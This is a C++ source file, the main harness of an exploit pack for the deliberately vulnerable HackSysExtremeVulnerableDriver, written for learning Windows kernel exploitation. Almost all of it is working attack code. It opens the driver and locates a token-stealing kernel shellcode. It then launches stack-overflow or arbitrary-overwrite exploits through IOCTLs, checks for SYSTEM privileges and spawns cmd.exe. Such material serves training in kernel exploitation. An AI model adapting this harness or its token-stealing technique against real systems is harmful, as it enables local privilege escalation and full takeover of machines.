/**
 * HackSysExtremeVulnerableDriver exploit pack consisting of all of the possible
 * exploits against that vulnerable driver. To be used in learning process of 
 * Windows Kernel Exploitation journey. 
 *
 * Intended to be run under: Windows 7 SP1 x86, English
 * 
 * Mariusz B. / mgeeky.
 *
**/

#include "common.h"
#include "driver.h"
#include "HevdConstants.h"

#include "StackOverflow.h"
#include "ArbitraryOverwrite.h"


map<DWORD, const wchar_t*> g_ioctlCodeNames {
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_STACK_OVERFLOW), 				L"HACKSYS_EVD_IOCTL_STACK_OVERFLOW"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS), 			L"HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS"				},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE), 			L"HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE"			},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_POOL_OVERFLOW),                 L"HACKSYS_EVD_IOCTL_POOL_OVERFLOW"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT), 			L"HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT"			},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_USE_UAF_OBJECT), 				L"HACKSYS_EVD_IOCTL_USE_UAF_OBJECT"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT), 				L"HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT"				},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT), 			L"HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT"			},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_TYPE_CONFUSION), 				L"HACKSYS_EVD_IOCTL_TYPE_CONFUSION"					},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW), 				L"HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW"				},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE), 		L"HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE"		},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE), 	L"HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE"	},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE), 	L"HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE"	},
	{ IOCTL_CODES(HACKSYS_EVD_IOCTL_DOUBLE_FETCH), 					L"HACKSYS_EVD_IOCTL_DOUBLE_FETCH" 					}
};

const wstring& Vulnerable_Driver_Name 			= L"HackSysExtremeVulnerableDriver";
const wstring& Vulnerable_Driver_Module_Name 	= L"HEVD";
const wstring& Command_To_Execute 				= L"cmd.exe";

void *tokenStealingPayloadRealPointer 			= nullptr;
size_t tokenStealingPayloadSize					= 0;


const wchar_t* 
getErrorString(DWORD error) {
	wchar_t buf[256];
	FormatMessageW(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 
    				MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, 256, NULL);
	wstringstream err;
	err << L"(" << trim(wstring(buf)) << L"; code: " << error << L")";
	return err.str().c_str();
}


bool
checkExploitSuccess() {
	wchar_t userName[256 + 1] = {0};
	DWORD userNameSize = sizeof(userName);
	
	if (GetUserNameW(userName, &userNameSize)) {
		wcout << L"[.] Exploit success check: Current user: (" << userName 
			<< L"), expected: (SYSTEM)" << endl;
			
		return wstring(userName) == wstring(L"SYSTEM");
	}
	
	return false;
}

int 
main(
	int argc, 
	char** argv
) {
	
	wcout << L"\t" << Vulnerable_Driver_Name << endl;
	wcout << L"\tLocal Privilege Escalation exploit's pack'" << endl;
	wcout << L"\tMariusz B. / mgeeky, '17" << endl << endl;
	
	Driver driver(Vulnerable_Driver_Name, Vulnerable_Driver_Module_Name, &g_ioctlCodeNames);	
	if(!driver) {
		wcerr << L"[!] Could not open the driver.\n\tError: " << getErrorString(driver.getError()) << endl;
		return 1;
	}
	
	wcout << L"[+] Opened " << Vulnerable_Driver_Name << " driver's handle." << endl;
	
	shared_ptr<IExploit> exploits[] = {
		shared_ptr<IExploit>(new ExploitStackOverflow(driver)),
		shared_ptr<IExploit>(new ExploitArbitraryOverwrite(driver)),
	};
	
	// Looking for opening NOPs address of the token_stealing_win7 payload
	char *ptr = reinterpret_cast<char*>(&token_stealing_win7) - 16;
	bool found = false;
	for(size_t pos = 0; pos < 32; pos++ ) {
		if (ptr[pos + 0] == (char)0x90 && 
			ptr[pos + 1] == (char)0x90 && 
			ptr[pos + 2] == (char)0x90 && 
			ptr[pos + 3] == (char)0x90) {
			tokenStealingPayloadRealPointer = &ptr[pos];		
			found = true;
			break;
		}
	}
	
	if (!found) {
		wcerr << L"[!] Compiler's optimizations (gcc/g++) has corrupted internal layout " << endl
			<< L"\tof `token_stealing_win7` naked function. The exploit cannot continue." << endl;
		return 1;
	}
	
	// Determining current size of the payload
	for(size_t pos = 0; pos < 512; pos++ ) {
		if (ptr[pos + 0] == (char)0xcc && 
			ptr[pos + 1] == (char)0xcc && 
			ptr[pos + 2] == (char)0xcc && 
			ptr[pos + 3] == (char)0xcc) {
			tokenStealingPayloadSize = pos;
		}
	}
		
	wcout << L"[?] Kernel shellcode in user-memory at: 0x" << hex << setw(8) << setfill(L'0')
			<< reinterpret_cast<DWORD>(tokenStealingPayloadRealPointer) 
			<< L" (size: " << tokenStealingPayloadSize << L" bytes)." << endl << endl;
			
	wcout << wstring(32, L'-') << endl;
	
	size_t num = 0;
	for(auto exp : exploits) {
		wcout << L"[" << setw(2) << setfill(L'0') << (++num) << L"] " << exp->getName() 
				<< L", IOCTL code: 0x" << hex << setw(8) << setfill(L'0') << exp->getIoctlCode() 
				<< endl;
	}
	
	wcout << L"[99] " << L"Exit." << endl;
	
	size_t exploitNum = 0;
	
	while ((exploitNum < 1 || exploitNum > num) && exploitNum != 99) {
		wcout << endl << L"[..] Select an exploit to launch against " << Vulnerable_Driver_Module_Name 
			<< L".SYS (or 99 to exit): ";
			
		cin >> exploitNum;
		cin.ignore();
		
		if ((exploitNum < 1 || exploitNum > num) && exploitNum != 99)  {
			wcerr << L"[ !] You've specified wrong exploit's number. Try again." << endl;
		}
	}
	
	if (exploitNum == 99) return 0;
		
	wcout << endl << wstring(32, L'-') << endl;
	
	// Launch the selected exploit.
	if (!SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST)) {
		wcerr << L"[-] Could not set thread's priority to HIGHEST. Continuing...";
	}
	
	bool ret = exploits[exploitNum-1]->exploit();
	
	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
	
	if (ret) {
		wcout << L"[.] Exploit has been launched without errors." << endl;
		
		if (checkExploitSuccess()) {
			// Current process' token has been elevated to the SYSTEM's one.
			wcout << L"[+] Succeeded. Enjoy your SYSTEM! :-)" << endl << endl
					<< wstring(32, L'-') << endl << endl;
			
			const std::string cmd(Command_To_Execute.begin(), Command_To_Execute.end());
			system(cmd.c_str());
		} 
		else {
			wcout << L"[!] Failed. That's a pity." << endl;
		}
		
	} else {
		wcerr << L"[!] Exploit has failed." << endl;
	}
	
	return 0;
}
